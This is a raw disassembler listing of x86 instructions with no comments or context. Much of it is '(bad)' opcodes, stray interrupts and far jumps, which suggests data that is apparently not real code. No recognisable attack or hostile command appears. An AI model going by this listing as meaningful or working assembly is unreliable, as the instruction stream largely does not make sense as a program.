  426ab7:	add    al,0x6d
  426ab9:	sub    ch,cl
  426abb:	jge    0x426a75
  426abd:	or     cl,bh
  426abf:	mov    eax,0xcf000000
  426ac4:	mov    ch,BYTE PTR [eax]
  426ac6:	mov    eax,0xbccf0a
  426acb:	add    BYTE PTR [eax],al
  426acd:	add    al,0xd3
  426acf:	pusha  
  426ad0:	mov    eax,0xc0cf0a
  426ad5:	add    BYTE PTR [eax],al
  426ad7:	iret   
  426ad8:	mov    cl,BYTE PTR [edx-0x48]
  426adb:	or     cl,bh
  426add:	les    eax,FWORD PTR [eax]
  426adf:	add    BYTE PTR [eax],al
  426ae1:	int    0xf9
  426ae3:	mov    eax,0x9c670a
  426ae8:	add    BYTE PTR [eax],al
  426aea:	iret   
  426aeb:	loopne 0x426a8d
  426aed:	pop    edi
  426aee:	add    BYTE PTR ds:0xab88080,dh
  426af4:	iret   
  426af5:	enter  0x0,0x0
  426af9:	iret   
  426afa:	mov    bh,bh
  426afc:	mov    eax,0x90cf0a
  426b01:	add    BYTE PTR [eax],al
  426b03:	mov    eax,0xa0670a
  426b08:	add    BYTE PTR [eax],al
  426b0a:	add    al,0xc9
  426b0c:	stc    
  426b0d:	mov    eax,0xa4670a
  426b12:	add    BYTE PTR [eax],al
  426b14:	int    0xf9
  426b16:	pop    edi
  426b17:	leave  
  426b18:	xor    eax,0xab88080
  426b1d:	iret   
  426b1e:	add    BYTE PTR [eax],0x0
  426b21:	add    ch,cl
  426b23:	jge    0x426add
  426b25:	or     cl,bh
  426b27:	aam    0x0
  426b29:	add    BYTE PTR [eax],al
  426b2b:	int    0xc5
  426b2d:	mov    eax,0xe0060a
  426b32:	add    BYTE PTR [eax],al
  426b34:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b37:	or     ah,BYTE PTR [edi-0x58]
  426b3a:	add    BYTE PTR [eax],al
  426b3c:	add    bh,cl
  426b3e:	addr16 in al,0x0
  426b41:	add    BYTE PTR [eax],al
  426b43:	leave  
  426b44:	push   es
  426b45:	lods   al,BYTE PTR ds:[esi]
  426b46:	add    BYTE PTR [eax],al
  426b48:	add    dh,ah
  426b4a:	xor    eax,0x6c9352b
  426b4f:	fadd   DWORD PTR [eax]
  426b51:	add    BYTE PTR [eax],al
  426b53:	jae    0x426b8a
  426b55:	jno    0x426b8c
  426b57:	mov    eax,0x3076cdaf
  426b5c:	int    0x8d
  426b5e:	xor    ch,cl
  426b60:	xchg   esi,eax
  426b61:	xor    BYTE PTR [edx+eax*1],al
  426b64:	call   ebx
  426b66:	repnz sub BYTE PTR [ebx],bh
  426b69:	jns    0x426b3e
  426b6b:	mov    ebp,0xcdd35392
  426b70:	lea    esi,[eax]
  426b72:	add    al,0x2
  426b74:	(bad)  
  426b75:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b7b:	repz xchg edx,eax
  426b7d:	push   ebx
  426b7e:	jecxz  0x426bbb
  426b80:	retf   
  426b81:	add    al,0xd2
  426b83:	sbb    bl,BYTE PTR [ebx]
  426b85:	retf   
  426b86:	cmp    eax,DWORD PTR [eax]
  426b88:	inc    ebx
  426b89:	cli    
  426b8a:	das    
  426b8b:	or     cl,dl
  426b8d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b94:	das    
  426b95:	add    al,0x37
  426b97:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b9e:	xchg   esi,eax
  426b9f:	xor    BYTE PTR [ebx],bh
  426ba1:	psrlq  mm5,mm3
  426ba4:	xchg   edx,eax
  426ba5:	add    al,0xfb
  426ba7:	call   ebx
  426ba9:	jmp    0xcd7d:0x87135328
  426bb0:	aad    0xb8
  426bb2:	cmp    edx,DWORD PTR ds:0x708d
  426bb8:	add    ch,cl
  426bba:	lea    esi,[eax]
  426bbc:	int    0xe6
  426bbe:	xor    BYTE PTR [ebx],bh
  426bc0:	psrlq  mm5,mm3
  426bc3:	xchg   edx,eax
  426bc4:	add    al,0xf8
  426bc6:	call   ebx
  426bc8:	jmp    0x8832bef5
  426bcd:	jge    0x426b87
  426bcf:	int    0xcc
  426bd1:	lea    esi,[eax+0x0]
  426bd4:	add    BYTE PTR [eax],al
  426bd6:	mov    eax,0xd3b8e3f8
  426bdb:	repnz das 
  426bdd:	mov    eax,0x53b8f3e3
  426be2:	jecxz  0x426bb1
  426be4:	lea    esi,[eax]
  426be6:	int    0xe6
  426be8:	xor    BYTE PTR [ebx],bh
  426bea:	psrlq  mm5,mm3
  426bed:	xchg   edx,eax
  426bee:	add    al,0xf8
  426bf0:	call   ebx
  426bf2:	jmp    0x8832bf1f
  426bf7:	jge    0x426bb1
  426bf9:	or     dl,BYTE PTR ds:0x708d
  426bff:	add    ch,cl
  426c01:	lea    esi,[eax]
  426c03:	int    0x96
  426c05:	xor    BYTE PTR [ebx],bh
  426c07:	(bad)  
  426c09:	sti    
  426c0a:	call   ebx
  426c0c:	jmp    0x426ba0
  426c0e:	shr    edx,cl
  426c10:	sub    BYTE PTR [ebx+0x13],dl
  426c13:	int    0x96
  426c15:	xor    BYTE PTR [edi+0x308dcdd3],al
  426c1b:	add    al,0x2
  426c1d:	(bad)  
  426c1e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426c24:	repz xchg edx,eax
  426c26:	push   ebx
  426c27:	jecxz  0x426c64
  426c29:	retf   
  426c2a:	add    al,0xd2
  426c2c:	sbb    bl,BYTE PTR [ebx]
  426c2e:	retf   
  426c2f:	cmp    eax,DWORD PTR [eax]
  426c31:	inc    ebx
  426c32:	cli    
  426c33:	das    
  426c34:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c3a:	pop    es
  426c3b:	pop    ebx
  426c3c:	add    BYTE PTR [eax],al
  426c3e:	add    bl,al
  426c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c41:	mov    esi,0x76cf4229
  426c46:	jne    0x426c52
  426c48:	jbe    0x426bd2
  426c4a:	int    0x76
  426c4c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c52:	or     bl,BYTE PTR [ecx+ecx*8]
  426c55:	ins    BYTE PTR es:[edi],dx
  426c56:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c5c:	jbe    0x426cd3
  426c5e:	int    0x8d
  426c60:	jge    0x426c91
  426c62:	inc    ebp
  426c63:	jge    0x426bf7
  426c65:	shr    ebx,cl
  426c67:	xchg   edx,eax
  426c68:	int    0x8d
  426c6a:	jne    0x426c39
  426c6c:	xchg   esi,eax
  426c6d:	jge    0x426caa
  426c6f:	leave  
  426c70:	cmp    ebx,edx
  426c72:	push   ebx
  426c73:	icebp  
  426c74:	int    0x76
  426c76:	cmc    
  426c77:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c7d:	jo     0x426c4e
  426c7f:	push   es
  426c80:	cmc    
  426c81:	inc    DWORD PTR [eax]
  426c83:	add    BYTE PTR [eax-0x2d],dh
  426c86:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c8d:	int    0x76
  426c8f:	in     eax,dx
  426c90:	int    0x8d
  426c92:	adc    DWORD PTR [edi],ebp
  426c94:	inc    ebp
  426c95:	jge    0x426c29
  426c97:	shr    ebx,cl
  426c99:	xchg   edx,eax
  426c9a:	int    0x8d
  426c9c:	in     eax,dx
  426c9d:	int    0x96
  426c9f:	adc    ebx,edx
  426ca1:	repnz sub ch,cl
  426ca4:	iret   
  426ca5:	cmc    
  426ca6:	inc    DWORD PTR [eax]
  426ca8:	add    ch,cl
  426caa:	mov    DWORD PTR [ebx],edi
  426cac:	leave  
  426cad:	cmp    ebx,edx
  426caf:	push   ebx
  426cb0:	rol    BYTE PTR [ebx+0x7d],cl
  426cb3:	das    
  426cb4:	push   es
  426cb5:	push   ebp
  426cb6:	add    BYTE PTR [eax-0xa293280],0xc9
  426cbd:	jbe    0x426ccc
  426cbf:	(bad)  
  426cc0:	ficom  WORD PTR ss:[ebx]
  426cc3:	pop    ebp
  426cc4:	mov    ebp,0xa25230a
  426cc9:	jbe    0x426cbc
  426ccb:	or     ah,BYTE PTR [esi-0x6289f56b]
  426cd1:	int    0x76
  426cd3:	xchg   ebp,eax
  426cd4:	int    0x8d
  426cd6:	popf   
  426cd7:	das    
  426cd8:	inc    ebp
  426cd9:	jge    0x426c6d
  426cdb:	shr    ebx,cl
  426cdd:	xchg   edx,eax
  426cde:	int    0x8d
  426ce0:	xchg   ebp,eax
  426ce1:	int    0x96
  426ce3:	popf   
  426ce4:	cmp    ecx,ecx
  426ce6:	cmp    ebx,edx
  426ce8:	push   ebx
  426ce9:	icebp  
  426cea:	bound  eax,QWORD PTR [eax]
  426cec:	(bad)  
  426ced:	xor    al,0xd3
  426cef:	repnz sub BYTE PTR [eax],al
  426cf2:	pop    ecx
  426cf3:	xor    eax,0xbd808081
  426cf8:	push   eax
  426cf9:	repnz add BYTE PTR [eax],al
  426cfc:	int    0x76
  426cfe:	xchg   ebp,eax
  426cff:	int    0x8d
  426d01:	popf   
  426d02:	das    
  426d03:	inc    ebp
  426d04:	jge    0x426c98
  426d06:	shr    ebx,cl
  426d08:	xchg   edx,eax
  426d09:	int    0x8d
  426d0b:	xchg   ebp,eax
  426d0c:	int    0x96
  426d0e:	popf   
  426d0f:	cmp    ecx,ecx
  426d11:	cmp    ebx,edx
  426d13:	push   ebx
  426d14:	icebp  
  426d15:	bound  eax,QWORD PTR [eax]
  426d17:	pop    ecx
  426d18:	xor    eax,0xd3808081
  426d1d:	repnz sub BYTE PTR [eax],al
  426d20:	pop    ecx
  426d21:	sub    eax,0xbd808081
  426d26:	xchg   edx,eax
  426d27:	repnz add BYTE PTR [eax],al
  426d2a:	int    0x7
  426d2c:	xor    eax,0xcd808081
  426d31:	mov    ch,cl
  426d33:	jle    0x426d99
  426d35:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d3b:	lea    ecx,ds:0x2ff176cd
  426d41:	inc    ebp
  426d42:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d48:	jbe    0x426d57
  426d4a:	int    0x96
  426d4c:	icebp  
  426d4d:	cmp    esi,eax
  426d4f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d55:	ror    ebp,cl
  426d57:	lea    ecx,[eax+0x187ebb2f]
  426d5d:	push   es
  426d5e:	jge    0x426d34
  426d60:	dec    esp
  426d61:	int    0x7
  426d63:	popf   
  426d64:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d6e:	jbe    0x426dbc
  426d70:	int    0x76
  426d72:	xor    BYTE PTR [eax],al
  426d74:	(bad)  
  426d75:	cmp    al,0x0
  426d77:	(bad)  
  426d78:	cmc    
  426d79:	add    dh,dl
  426d7b:	sub    al,0x0
  426d7d:	(bad)  
  426d7e:	and    al,0x0
  426d80:	(bad)  
  426d81:	sbb    al,0x0
  426d83:	(bad)  
  426d84:	adc    al,0xbd
  426d86:	test   ch,dh
  426d88:	add    BYTE PTR [eax],al
  426d8a:	or     al,BYTE PTR [esi]
  426d8c:	adc    edi,edi
  426d8e:	add    BYTE PTR [eax],al
  426d90:	int    0x76
  426d92:	cmp    al,0x4
  426d94:	fcom   QWORD PTR [eax+eax*4]
  426d97:	aam    0x1a
  426d99:	int    0x76
  426d9b:	cmp    al,0x4
  426d9d:	fsub   QWORD PTR [eax+eax*4]
  426da0:	aam    0x4e
  426da2:	int    0x6
  426da4:	adc    edi,edi
  426da6:	add    BYTE PTR [eax],al
  426da8:	int    0x8d
  426daa:	cmp    al,0xa
  426dac:	outs   dx,BYTE PTR ds:[esi]
  426dad:	sbb    al,0xec
  426daf:	push   ebx
  426db0:	add    dh,dl
  426db2:	cmp    al,0x0
  426db4:	(bad)  
  426db5:	cmc    
  426db6:	mov    ebp,0x6daa
  426dbb:	stos   BYTE PTR es:[edi],al
  426dbc:	test   al,0x63
  426dbe:	retf   
  426dbf:	shl    BYTE PTR [eax+eax*4],cl
  426dc2:	xchg   esi,eax
  426dc3:	int    0xed
  426dc5:	jno    0x426e38
  426dc7:	cwde   
  426dc8:	leave  
  426dc9:	jbe    0x426dc8
  426dcb:	dec    ecx
  426dcc:	and    DWORD PTR [esi-0x68936cb],eax
  426dd2:	inc    ecx
  426dd3:	and    DWORD PTR [esi-0x28932cb],eax
  426dd9:	int    0xd6
  426ddb:	std    
  426ddc:	sar    bh,0x5f
  426ddf:	shl    DWORD PTR [ecx],1
  426de1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426de7:	sti    
  426de8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dee:	push   ebx
  426def:	jns    0x426dbe
  426df1:	(bad)  
  426df2:	mov    BYTE PTR [ebx+0x11],al
  426df5:	int    0x76
  426df7:	std    
  426df8:	aam    0xc4
  426dfa:	int    0xd6
  426dfc:	std    
  426dfd:	cmp    edx,ebx
  426dff:	cmp    edi,ebx
  426e01:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426e07:	push   ebx
  426e08:	jns    0x426dd7
  426e0a:	(bad)  
  426e0b:	dec    esp
  426e0c:	inc    ebx
  426e0d:	adc    esp,edx
  426e0f:	pop    ebx
  426e10:	int    0x96
  426e12:	xor    BYTE PTR [edx-0x32b31933],bl
  426e18:	jbe    0x426da2
  426e1a:	cmp    esi,edi
  426e1c:	push   es
  426e1d:	add    ah,dl
  426e1f:	push   esi
  426e20:	pop    ebx
  426e21:	retf   0x8624
  426e24:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426e2a:	das    
  426e2b:	push   es
  426e2c:	fcmovbe st,st(6)
  426e2e:	dec    esi
  426e2f:	add    al,0xf4
  426e31:	adc    DWORD PTR [edx],0xffffffc5
  426e34:	fwait
  426e35:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e3c:	dec    esp
  426e3d:	adc    ch,ah
  426e3f:	in     eax,dx
  426e40:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e47:	lea    ebp,[edi]
  426e49:	retf   0x2fa6
  426e4c:	or     DWORD PTR [esi+eax*4],esp
  426e4f:	js     0x426e94
  426e51:	clc    
  426e52:	or     BYTE PTR [esi],0x63
  426e55:	int    0x76
  426e57:	stc    
  426e58:	cmp    edx,ebx
  426e5a:	int    0x8d
  426e5c:	stc    
  426e5d:	add    al,0x2
  426e5f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e65:	std    
  426e66:	cmp    edx,ebx
  426e68:	int    0x8d
  426e6a:	std    
  426e6b:	cmp    edx,DWORD PTR [ebx]
  426e6d:	shl    edx,cl
  426e6f:	sub    bl,dl
  426e71:	mov    ebp,0xa8d35392
  426e76:	retf   
  426e77:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e7b:	int    0xed
  426e7d:	add    al,0xed
  426e7f:	(bad)  
  426e80:	leave  
  426e81:	jbe    0x426e80
  426e83:	dec    ecx
  426e84:	and    DWORD PTR [esi+0x21416135],eax
  426e8a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e90:	jbe    0x426ea6
  426e92:	or     dh,BYTE PTR [esi+0x14]
  426e95:	int    0x76
  426e97:	adc    al,0xcd
  426e99:	add    DWORD PTR ds:0xcd808081,ebp
  426e9f:	lea    edx,[ecx*8+0x2d0acd80]
  426ea6:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426eb0:	lea    esi,[ebp-0x32028933]
  426eb6:	(bad)  
  426eb7:	std    
  426eb8:	cwde   
  426eb9:	call   0x3b85:0x82cfffc0
  426ec0:	jns    0x426e95
  426ec2:	mov    ebp,0xf03baa92
  426ec7:	shl    edx,cl
  426ec9:	sub    BYTE PTR [ebx-0x2d],dl
  426ecc:	or     dh,BYTE PTR [esi-0x63]
  426ecf:	int    0x76
  426ed1:	std    
  426ed2:	int    0x8d
  426ed4:	std    
  426ed5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ed8:	mov    ebp,0xd3f03b92
  426edd:	repnz sub BYTE PTR [ebx-0x2d],dl
  426ee1:	or     dh,BYTE PTR [esi-0x53]
  426ee4:	int    0x76
  426ee6:	mov    ch,0xcd
  426ee8:	ins    BYTE PTR es:[edi],dx
  426ee9:	jo     0x426eef
  426eeb:	mov    ebp,0xf1760a4c
  426ef0:	int    0x76
  426ef2:	mov    ch,0xcd
  426ef4:	ins    BYTE PTR es:[edi],dx
  426ef5:	pop    esp
  426ef6:	int    0x8d
  426ef8:	mov    ch,0x7c
  426efa:	push   es
  426efb:	outs   dx,BYTE PTR ds:[esi]
  426efc:	xchg   esp,eax
  426efd:	int    0x76
  426eff:	mov    ch,0xd4
  426f01:	sbb    al,0xcd
  426f03:	ins    BYTE PTR es:[edi],dx
  426f04:	pop    esp
  426f05:	int    0x8d
  426f07:	mov    ch,0xcd
  426f09:	jle    0x426e9f
  426f0b:	jl     0x426f05
  426f0d:	icebp  
  426f0e:	sub    edi,DWORD PTR [ebp-0x33]
  426f11:	jbe    0x426ec8
  426f13:	int    0x6c
  426f15:	pop    esp
  426f16:	xchg   ebx,edx
  426f18:	in     al,dx
  426f19:	xchg   ebp,ecx
  426f1b:	ins    BYTE PTR es:[edi],dx
  426f1c:	xchg   esp,eax
  426f1d:	or     dh,BYTE PTR [esi-0x43]
  426f20:	int    0x76
  426f22:	std    
  426f23:	int    0x8d
  426f25:	std    
  426f26:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f29:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f30:	push   ebx
  426f31:	ror    DWORD PTR [edx],cl
  426f33:	jbe    0x426f49
  426f35:	int    0x76
  426f37:	std    
  426f38:	int    0x8d
  426f3a:	std    
  426f3b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f3e:	lock shl edx,cl
  426f41:	sub    bl,dl
  426f43:	mov    ebp,0xad35392
  426f48:	jbe    0x426f5e
  426f4a:	int    0x76
  426f4c:	std    
  426f4d:	int    0x8d
  426f4f:	std    
  426f50:	cmp    esi,eax
  426f52:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f55:	repnz sub bl,dl
  426f58:	mov    ebp,0xcdd35392
  426f5d:	lea    esi,[eax]
  426f5f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f65:	jbe    0x426f7b
  426f67:	cmp    DWORD PTR [ecx],esp
  426f69:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f6f:	and    DWORD PTR [esi+0x1476c935],eax
  426f75:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f7b:	xchg   BYTE PTR [eax-0x2893280],al
  426f81:	int    0x8d
  426f83:	std    
  426f84:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f87:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f8e:	push   ebx
  426f8f:	ror    DWORD PTR [edx],cl
  426f91:	jbe    0x426f40
  426f93:	int    0x76
  426f95:	mov    ebp,0xa4c7687
  426f9a:	jbe    0x426f39
  426f9c:	add    dh,dl
  426f9e:	popf   
  426f9f:	add    dh,dl
  426fa1:	dec    esp
  426fa2:	int    0x8d
  426fa4:	mov    ch,0xbd
  426fa6:	neg    bh
  426fa8:	add    BYTE PTR [eax],al
  426faa:	or     dh,BYTE PTR [esi+0x14]
  426fad:	int    0x76
  426faf:	adc    al,0x6
  426fb1:	ins    DWORD PTR es:[edi],dx
  426fb2:	aam    0x60
  426fb4:	int    0x76
  426fb6:	popf   
  426fb7:	or     dh,BYTE PTR [esi-0x5b]
  426fba:	int    0x76
  426fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fbd:	int    0x8d
  426fbf:	dec    esp
  426fc0:	xor    edx,ebx
  426fc2:	or     dh,BYTE PTR [esi-0x5b]
  426fc5:	int    0x76
  426fc7:	adc    al,0xcd
  426fc9:	lea    edx,[ecx*8+0x6e87306c]
  426fd0:	dec    esp
  426fd1:	int    0x8d
  426fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fd4:	inc    ebx
  426fd5:	jge    0x426f59
  426fd7:	sbb    ch,cl
  426fd9:	jbe    0x426fef
  426fdb:	int    0x6c
  426fdd:	dec    esp
  426fde:	int    0x8d
  426fe0:	adc    al,0x87
  426fe2:	outs   dx,BYTE PTR ds:[esi]
  426fe3:	mov    ch,cl
  426fe5:	lea    esp,[ebp-0x2e142ccd]
  426feb:	test   DWORD PTR [eax+0x2149bf80],eax
  426ff1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426ff7:	jbe    0x427076
  426ff9:	inc    ecx
  426ffa:	and    DWORD PTR [esi+0x7576c935],eax
  427000:	cmp    DWORD PTR [ecx],esp
  427002:	xchg   BYTE PTR ds:0xb26d76c9,dh
  427008:	and    DWORD PTR [esi+0xd76cf35],eax
  42700e:	or     dh,BYTE PTR [esi-0xb]
  427011:	iret   
  427012:	jbe    0x427091
  427014:	or     dh,BYTE PTR [esi+0x11]
  427017:	iret   
  427018:	jbe    0x42708f
  42701a:	or     dh,BYTE PTR [esi+0x14]
  42701d:	iret   
  42701e:	jbe    0x42708d
  427020:	or     dh,BYTE PTR [esi-0x13]
  427023:	int    0x76
  427025:	std    
  427026:	int    0x8d
  427028:	std    
  427029:	cmp    edi,DWORD PTR [ecx+0x3b]
  42702c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427033:	push   ebx
  427034:	ror    DWORD PTR [edx],cl
  427036:	jbe    0x426fdd
  427038:	jmp    0x42704d
  42703a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427040:	and    DWORD PTR [esi-0x22fad0cb],eax
  427046:	xchg   DWORD PTR [eax+0x4cc080],eax
  42704c:	(bad)  
  42704d:	popf   
  42704e:	iret   
  42704f:	jbe    0x427021
  427051:	jo     0x427010
  427053:	xlat   BYTE PTR ds:[ebx]
  427054:	fild   WORD PTR [eax]
  427056:	add    ch,cl
  427058:	jbe    0x427053
  42705a:	int    0x8d
  42705c:	stc    
  42705d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427060:	lock shl edx,cl
  427063:	sub    bl,dl
  427065:	mov    ebp,0xad35392
  42706a:	jbe    0x427019
  42706c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427072:	int    0x76
  427074:	xchg   ebp,eax
  427075:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42707b:	in     eax,0x28
  42707d:	push   ebx
  42707e:	popf   
  42707f:	or     ah,BYTE PTR [esi-0x689325b]
  427085:	int    0x8d
  427087:	stc    
  427088:	cmp    esi,eax
  42708a:	shl    edx,cl
  42708c:	sub    BYTE PTR [ebx],bh
  42708e:	jns    0x427063
  427090:	mov    ebp,0xcdd35392
  427095:	(bad)  
  427096:	stc    
  427097:	int    0x96
  427099:	stc    
  42709a:	cmp    ecx,DWORD PTR [edi]
  42709c:	cmp    ebx,ecx
  42709e:	shr    ebx,cl
  4270a0:	xchg   edx,eax
  4270a1:	shr    edx,cl
  4270a3:	sub    BYTE PTR [ebx+0x13],dl
  4270a6:	xchg   ebx,edx
  4270a8:	int    0x8d
  4270aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270ab:	or     ah,BYTE PTR [esi-0x2982bc9b]
  4270b1:	sub    ch,cl
  4270b3:	jbe    0x4270ae
  4270b5:	int    0x8d
  4270b7:	stc    
  4270b8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270bb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270c2:	push   ebx
  4270c3:	shl    DWORD PTR [eax-0x40],cl
  4270c6:	dec    esp
  4270c7:	iret   
  4270c8:	jbe    0x42709a
  4270ca:	jo     0x427089
  4270cc:	sti    
  4270cd:	std    
  4270ce:	add    BYTE PTR [eax],al
  4270d0:	int    0x76
  4270d2:	std    
  4270d3:	int    0x8d
  4270d5:	std    
  4270d6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270d9:	lock shl edx,cl
  4270dc:	sub    bl,dl
  4270de:	mov    ebp,0xcdd35392
  4270e3:	lea    esp,[ebp+0x28d47d43]
  4270e9:	int    0x76
  4270eb:	std    
  4270ec:	int    0x8d
  4270ee:	std    
  4270ef:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270f2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270f9:	push   ebx
  4270fa:	shl    DWORD PTR [eax-0x40],cl
  4270fd:	dec    esp
  4270fe:	iret   
  4270ff:	jbe    0x4270d1
  427101:	jo     0x4270c0
  427103:	mov    edi,0xcd0000fd
  427108:	jbe    0x4270ff
  42710a:	int    0x8d
  42710c:	cmc    
  42710d:	int    0x89
  42710f:	int    0x80
  427111:	cmp    esi,eax
  427113:	cmp    edi,DWORD PTR [ecx-0x2d]
  427116:	repnz sub bl,dl
  427119:	mov    ebp,0xcad35392
  42711e:	je     0x4270a5
  427120:	ror    ch,1
  427122:	(bad)  
  427123:	std    
  427124:	int    0x96
  427126:	std    
  427127:	cmp    ecx,DWORD PTR [edi]
  427129:	cmp    ebx,ecx
  42712b:	shr    ebx,cl
  42712d:	xchg   edx,eax
  42712e:	shr    edx,cl
  427130:	sub    BYTE PTR [edi],ch
  427132:	pop    ecx
  427133:	ins    DWORD PTR es:[edi],dx
  427134:	push   ebx
  427135:	adc    eax,DWORD PTR [ebx-0x2d]
  427138:	das    
  427139:	add    eax,0x80809212
  42713e:	int    0x76
  427140:	adc    ebp,ecx
  427142:	lea    edx,[ecx]
  427144:	int    0x89
  427146:	int    0x80
  427148:	cmp    esi,eax
  42714a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42714d:	repnz sub bl,dl
  427150:	mov    ebp,0xcad35392
  427155:	je     0x4270dc
  427157:	ror    ch,1
  427159:	(bad)  
  42715a:	std    
  42715b:	int    0x96
  42715d:	std    
  42715e:	cmp    ecx,DWORD PTR [edi]
  427160:	cmp    ebx,ecx
  427162:	shr    ebx,cl
  427164:	xchg   edx,eax
  427165:	shr    edx,cl
  427167:	sub    BYTE PTR [edi],ch
  427169:	pop    ecx
  42716a:	ins    DWORD PTR es:[edi],dx
  42716b:	push   ebx
  42716c:	adc    eax,DWORD PTR [ebx-0x2d]
  42716f:	das    
  427170:	add    eax,0x8080928a
  427175:	int    0x76
  427177:	adc    al,0xcd
  427179:	lea    edx,[ecx*8+0x3b80cd89]
  427180:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427184:	repnz sub bl,dl
  427187:	mov    ebp,0xcad35392
  42718c:	je     0x427113
  42718e:	ror    ch,1
  427190:	(bad)  
  427191:	std    
  427192:	int    0x96
  427194:	std    
  427195:	cmp    ecx,DWORD PTR [edi]
  427197:	cmp    ebx,ecx
  427199:	shr    ebx,cl
  42719b:	xchg   edx,eax
  42719c:	shr    edx,cl
  42719e:	sub    BYTE PTR [edi],ch
  4271a0:	pop    ecx
  4271a1:	ins    DWORD PTR es:[edi],dx
  4271a2:	push   ebx
  4271a3:	adc    eax,DWORD PTR [ebx-0x2d]
  4271a6:	das    
  4271a7:	add    eax,0x8080921b
  4271ac:	int    0x76
  4271ae:	in     eax,dx
  4271af:	int    0x8d
  4271b1:	in     eax,dx
  4271b2:	int    0x89
  4271b4:	int    0x80
  4271b6:	cmp    esi,eax
  4271b8:	cmp    edi,DWORD PTR [ecx-0x2d]
  4271bb:	repnz sub bl,dl
  4271be:	mov    ebp,0xcad35392
  4271c3:	je     0x42714a
  4271c5:	ror    ch,1
  4271c7:	(bad)  
  4271c8:	std    
  4271c9:	int    0x96
  4271cb:	std    
  4271cc:	cmp    ecx,DWORD PTR [edi]
  4271ce:	cmp    ebx,ecx
  4271d0:	shr    ebx,cl
  4271d2:	xchg   edx,eax
  4271d3:	shr    edx,cl
  4271d5:	sub    BYTE PTR [edi],ch
  4271d7:	pop    ecx
  4271d8:	ins    DWORD PTR es:[edi],dx
  4271d9:	push   ebx
  4271da:	adc    eax,DWORD PTR [ebx-0x2d]
  4271dd:	das    
  4271de:	add    eax,0x808081a5
  4271e3:	int    0x76
  4271e5:	adc    ebp,ecx
  4271e7:	lea    edx,[ecx]
  4271e9:	int    0x89
  4271eb:	int    0x80
  4271ed:	cmp    esi,eax
  4271ef:	shl    edx,cl
  4271f1:	sub    BYTE PTR [ebx],bh
  4271f3:	jns    0x4271c8
  4271f5:	mov    ebp,0xcad35392
  4271fa:	je     0x427181
  4271fc:	ror    ch,1
  4271fe:	(bad)  
  4271ff:	cmc    
  427200:	int    0x89
  427202:	int    0x96
  427204:	cmc    
  427205:	int    0x22
  427207:	cmp    ecx,DWORD PTR [edi]
  427209:	shr    ebx,cl
  42720b:	xchg   edx,eax
  42720c:	cmp    ebx,ecx
  42720e:	shr    edx,cl
  427210:	sub    BYTE PTR [ebx+0x13],dl
  427213:	retf   0x4d8c
  427216:	rol    BYTE PTR [edx-0x2d],1
  427219:	int    0x8d
  42721b:	adc    al,0xcd
  42721d:	mov    ebp,ecx
  42721f:	xchg   esi,eax
  427220:	adc    al,0xcd
  427222:	and    bh,BYTE PTR [ebx]
  427224:	psrlq  mm5,mm3
  427227:	xchg   edx,eax
  427228:	cmp    ebx,ecx
  42722a:	shr    edx,cl
  42722c:	sub    BYTE PTR [ebx+0x13],dl
  42722f:	retf   0x4d8c
  427232:	ror    BYTE PTR [edx-0x2d],1
  427235:	int    0x8d
  427237:	cmc    
  427238:	int    0x89
  42723a:	int    0x96
  42723c:	cmc    
  42723d:	int    0x22
  42723f:	cmp    ecx,DWORD PTR [edi]
  427241:	cmp    ebx,ecx
  427243:	shr    ebx,cl
  427245:	xchg   edx,eax
  427246:	shr    edx,cl
  427248:	sub    BYTE PTR [ebx+0x13],dl
  42724b:	retf   0x4d8c
  42724e:	push   ebp
  42724f:	pusha  
  427250:	jge    0x427281
  427252:	push   es
  427253:	mov    esp,0xcd808081
  427258:	jbe    0x42726e
  42725a:	int    0x8d
  42725c:	adc    al,0xcd
  42725e:	mov    ebp,ecx
